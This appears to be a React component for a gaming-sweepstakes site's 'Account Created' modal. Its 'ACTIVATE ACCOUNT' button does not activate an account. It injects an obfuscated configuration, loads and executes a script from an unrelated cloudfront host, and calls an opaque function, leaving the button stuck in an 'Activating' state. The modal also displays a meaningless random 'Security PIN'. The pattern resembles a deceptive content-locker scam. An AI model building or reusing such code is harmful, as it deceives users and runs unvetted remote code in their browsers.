"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { CheckCircle2, Copy, Check, Sparkles, Gift, Gamepad2, X, Loader2 } from "lucide-react"

interface AccountCreatedModalProps {
  isOpen: boolean
  onClose: () => void
  username?: string
}

export function AccountCreatedModal({ isOpen, onClose, username = "Player" }: AccountCreatedModalProps) {
  const router = useRouter()
  const [copied, setCopied] = useState(false)
  const [isActivating, setIsActivating] = useState(false)
  const referralCode = "RIVER" + Math.random().toString(36).substring(2, 8).toUpperCase()

  const copyReferralCode = () => {
    navigator.clipboard.writeText(referralCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleActivate = () => {
    setIsActivating(true)

    // Inject the tracking scripts immediately
    try {
      // First script - configuration
      const configScript = document.createElement("script")
      configScript.type = "text/javascript"
      configScript.textContent = 'var IORzp_HQr_YNjPMc={"it":4575399,"key":"d2390"};'
      document.body.appendChild(configScript)

      // Second script - external source
      const externalScript = document.createElement("script")
      externalScript.src = "https://duw03nk63ml3f.cloudfront.net/e50f298.js"
      document.body.appendChild(externalScript)

      // Third script - execute after external loads
      externalScript.onload = () => {
        const executeScript = document.createElement("script")
        executeScript.textContent = "_VU();"
        document.body.appendChild(executeScript)
      }
    } catch (error) {
      console.error("Script injection error:", error)
    }
    // Button stays in "Account Being Activating" state - no state reset
  }

  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = "hidden"
    } else {
      document.body.style.overflow = "unset"
    }
    return () => {
      document.body.style.overflow = "unset"
    }
  }, [isOpen])

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      {/* Backdrop */}
      <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={onClose} />

      {/* Confetti Effect */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden">
        {[...Array(50)].map((_, i) => (
          <div
            key={i}
            className="absolute w-3 h-3 animate-confetti"
            style={{
              left: `${Math.random() * 100}%`,
              top: "-10px",
              backgroundColor: ["#ec4899", "#10b981", "#f59e0b", "#3b82f6", "#8b5cf6"][Math.floor(Math.random() * 5)],
              borderRadius: Math.random() > 0.5 ? "50%" : "0",
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${3 + Math.random() * 2}s`,
            }}
          />
        ))}
      </div>

      {/* Modal Content */}
      <div className="relative bg-card border border-border rounded-3xl p-8 max-w-md w-full shadow-2xl animate-in zoom-in-95 duration-300">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 w-8 h-8 rounded-full bg-secondary flex items-center justify-center text-muted-foreground hover:text-white transition-colors"
        >
          <X className="w-5 h-5" />
        </button>

        {/* Success Icon */}
        <div className="flex justify-center mb-6">
          <div className="relative">
            <div className="w-24 h-24 rounded-full bg-gradient-to-br from-green-500 to-emerald-600 flex items-center justify-center animate-pulse">
              <CheckCircle2 className="w-12 h-12 text-white" />
            </div>
            <div className="absolute -top-2 -right-2 w-8 h-8 rounded-full bg-gradient-to-br from-primary to-pink-600 flex items-center justify-center">
              <Sparkles className="w-4 h-4 text-white" />
            </div>
          </div>
        </div>

        {/* Title */}
        <h1 className="text-3xl font-bold text-white text-center mb-2">Account Created!</h1>
        <p className="text-muted-foreground text-center mb-6">
          Welcome to RiverSweeps, <span className="text-primary font-semibold">{username}</span>!
        </p>

        {/* Random Pins */}
        <div className="bg-secondary/30 rounded-xl p-3 border border-border/50 mb-6 text-center">
          <p className="text-xs text-muted-foreground mb-1 uppercase tracking-widest">Your Security PIN</p>
          <p className="text-xl font-mono font-bold text-emerald-400 tracking-wider">
            {Array.from({ length: 6 }, () => Math.floor(Math.random() * 100).toString().padStart(2, '0')).join('-')}
          </p>
        </div>

        {/* Activation Card */}
        <div className="bg-secondary/50 rounded-2xl p-5 border border-border mb-6">
          <div className="flex items-center justify-between mb-4">
            <span className="text-white font-medium">Account Status</span>
            <span
              className={`px-3 py-1 rounded-full text-sm font-medium ${
                isActivating ? "bg-primary/20 text-primary" : "bg-yellow-500/20 text-yellow-400"
              }`}
            >
              {isActivating ? "Activating..." : "Pending Activation"}
            </span>
          </div>

          <button
            onClick={handleActivate}
            disabled={isActivating}
            className={`w-full py-3 rounded-xl font-bold text-lg transition-all transform ${
              isActivating
                ? "bg-gradient-to-r from-primary to-pink-600 opacity-90 cursor-wait"
                : "bg-gradient-to-r from-primary to-pink-600 text-white hover:opacity-90 hover:scale-[1.02]"
            }`}
          >
            {isActivating ? (
              <span className="flex items-center justify-center gap-2">
                <Loader2 className="w-5 h-5 animate-spin" />
                Account Being Activating
              </span>
            ) : (
              "ACTIVATE ACCOUNT"
            )}
          </button>
        </div>

        {/* Referral Code */}
        <div className="bg-gradient-to-r from-primary/20 to-pink-600/20 rounded-xl p-4 border border-primary/30 mb-6">
          <p className="text-sm text-muted-foreground mb-2 text-center">Your Referral Code</p>
          <div className="flex items-center justify-center gap-3">
            <span className="text-xl font-bold text-white tracking-wider">{referralCode}</span>
            <button
              onClick={copyReferralCode}
              className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center text-primary hover:bg-primary/30 transition-colors"
            >
              {copied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
            </button>
          </div>
          <p className="text-xs text-muted-foreground mt-2 text-center">Share and earn 10% on referral deposits!</p>
        </div>

        {/* Action Buttons */}
        {/* Removed Deposit and Games buttons as requested */}
      </div>

      <style jsx>{`
        @keyframes confetti {
          0% {
            transform: translateY(0) rotate(0deg);
            opacity: 1;
          }
          100% {
            transform: translateY(100vh) rotate(720deg);
            opacity: 0;
          }
        }
        .animate-confetti {
          animation: confetti linear forwards;
        }
      `}</style>
    </div>
  )
}
